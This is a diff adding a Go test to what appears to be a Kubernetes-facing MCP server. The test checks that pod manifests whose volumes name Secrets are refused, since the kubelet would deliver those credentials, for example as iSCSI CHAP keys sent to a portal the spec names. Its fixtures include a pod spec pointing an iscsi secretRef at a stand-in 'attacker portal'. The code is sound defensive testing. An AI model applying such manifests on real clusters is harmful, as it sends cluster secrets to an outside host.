@@ -781,6 +781,84 @@ func TestSecretBearingPodSpecsAreRefused(t *testing.T) {
 	})
 }
 
+// A volume that names a Secret for the kubelet to deliver leaks it without
+// any container reading it: the in-tree iSCSI plugin logs in to the portal
+// the pod spec names with the Secret's CHAP keys. Every such reference is
+// refused, the removed in-tree plugins included, and the refusal says the
+// kubelet sends the values, not that a container could print them.
+func TestVolumeSecretRefsAreRefused(t *testing.T) {
+	s := newWriteSession(t, true, true)
+	container := []any{map[string]any{"name": "c", "image": "busybox"}}
+	ref := map[string]any{"name": "chap"}
+	for _, tc := range []struct {
+		name   string
+		volume map[string]any
+		want   string
+	}{
+		{"iscsi secretRef to an attacker portal", map[string]any{"iscsi": map[string]any{
+			"targetPortal": "198.51.100.7:3260", "iqn": "iqn.2026-10.example.attacker:t", "lun": int64(0),
+			"chapAuthSession": true, "secretRef": ref,
+		}}, "a volume's iscsi.secretRef"},
+		{"csi nodePublishSecretRef", map[string]any{"csi": map[string]any{
+			"driver": "csi.example.com", "nodePublishSecretRef": ref,
+		}}, "a volume's csi.nodePublishSecretRef"},
+		{"flexVolume secretRef", map[string]any{"flexVolume": map[string]any{
+			"driver": "example.com/flex", "secretRef": ref,
+		}}, "a volume's flexVolume.secretRef"},
+		{"rbd secretRef", map[string]any{"rbd": map[string]any{
+			"monitors": []any{"198.51.100.7:6789"}, "image": "img", "secretRef": ref,
+		}}, "a volume's rbd.secretRef"},
+		{"cephfs secretRef", map[string]any{"cephfs": map[string]any{
+			"monitors": []any{"198.51.100.7:6789"}, "secretRef": ref,
+		}}, "a volume's cephfs.secretRef"},
+		{"cinder secretRef", map[string]any{"cinder": map[string]any{
+			"volumeID": "v", "secretRef": ref,
+		}}, "a volume's cinder.secretRef"},
+		{"scaleIO secretRef", map[string]any{"scaleIO": map[string]any{
+			"gateway": "https://198.51.100.7", "system": "s", "secretRef": ref,
+		}}, "a volume's scaleIO.secretRef"},
+		{"storageos secretRef", map[string]any{"storageos": map[string]any{
+			"volumeName": "v", "secretRef": ref,
+		}}, "a volume's storageos.secretRef"},
+		{"azureFile secretName", map[string]any{"azureFile": map[string]any{
+			"secretName": "chap", "shareName": "s",
+		}}, "a volume's azureFile.secretName"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			tc.volume["name"] = "v"
+			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
+				"apiVersion": "v1", "kind": "Pod",
+				"metadata": map[string]any{"name": "leak", "namespace": s.namespace},
+				"spec":     map[string]any{"containers": container, "volumes": []any{tc.volume}},
+			}})
+			if !strings.Contains(msg, tc.want) {
+				t.Errorf("error %q does not name %q", msg, tc.want)
+			}
+			if !strings.Contains(msg, "the kubelet reads that Secret") {
+				t.Errorf("error %q does not say why: the kubelet delivers the Secret", msg)
+			}
+		})
+	}
+
+	// The refusal is for the Secret, not the volume type.
+	t.Run("an iscsi volume without a secretRef is still applied", func(t *testing.T) {
+		var out mcpsrv.ResourceApplyOut
+		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
+			"apiVersion": "v1", "kind": "Pod",
+			"metadata": map[string]any{"name": "iscsi-plain", "namespace": s.namespace},
+			"spec": map[string]any{
+				"containers": container,
+				"volumes": []any{map[string]any{"name": "v", "iscsi": map[string]any{
+					"targetPortal": "198.51.100.7:3260", "iqn": "iqn.2026-10.example.lab:t", "lun": int64(0),
+				}}},
+			},
+		}}, &out)
+		if out.Name != "iscsi-plain" {
+			t.Errorf("out = %+v", out)
+		}
+	})
+}
+
 // The operator deletes whatever its kube-system inventory lists, and a
 // node-client claim holds a node name, both with the operator's own
 // cluster-admin identity. Writing either through this server would get around
